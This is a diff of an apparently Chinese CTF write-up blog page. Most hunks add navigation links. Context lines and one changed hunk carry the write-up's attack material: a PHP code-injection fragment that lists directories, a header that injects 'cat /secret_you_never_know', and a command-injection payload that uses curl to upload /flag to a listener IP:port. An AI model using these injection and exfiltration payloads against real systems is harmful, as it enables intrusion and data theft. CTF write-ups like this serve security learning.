@@ -85,11 +85,44 @@ code&amp;#x3D;$a&amp;#x3D;new FilesystemIterator(&amp;quot;.&amp;quot;);var_dump
   
   <li class="hide-on-med-and-down nav-item">
     
+    <a href="/tags" class="waves-effect waves-light">
+      
+      <i class="fas fa-tags" style="zoom: 0.6;"></i>
+      
+      <span>标签</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories" class="waves-effect waves-light">
+      
+      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
+      
+      <span>分类</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
     <a href="/archives" class="waves-effect waves-light">
       
       <i class="fas fa-archive" style="zoom: 0.6;"></i>
       
       <span>归档</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/about" class="waves-effect waves-light">
+      
+      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
+      
+      <span>关于</span>
     </a>
     
   </li>
@@ -147,11 +180,44 @@ code&amp;#x3D;$a&amp;#x3D;new FilesystemIterator(&amp;quot;.&amp;quot;);var_dump
         
         <li class="m-nav-item">
 	  
+		<a href="/tags" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-tags"></i>
+			
+			标签
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-bookmark"></i>
+			
+			分类
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
 		<a href="/archives" class="waves-effect waves-light">
 			
 			    <i class="fa-fw fas fa-archive"></i>
 			
 			归档
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-user-circle"></i>
+			
+			关于
 		</a>
           
         </li>
@@ -684,7 +750,7 @@ X-Forwarded-Host: cat &#x2F;secret_you_never_know<span aria-hidden="true" class=
 <pre class="line-numbers language-none"><code class="language-none">payload:?url&#x3D;http:&#x2F;&#x2F;监听使用的ip:port&#x2F;&#39; -F file&#x3D;@&#x2F;flag&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>实际传入shell的是</p>
-<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">curl &#39;http:&#x2F;&#x2F;IP:端口&#x2F;&#39;\\&#39;&#39; -F file&#x3D;@&#x2F;flag&#39;\\&#39;&#39;&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">curl</span> <span class="token string">'http://IP:端口/'</span><span class="token punctuation">\</span><span class="token punctuation">\</span>'<span class="token string">' -F file=@/flag'</span><span class="token punctuation">\</span><span class="token punctuation">\</span>'<span class="token string">''</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>直接带出文件</p>
 <p><strong>689</strong></p>
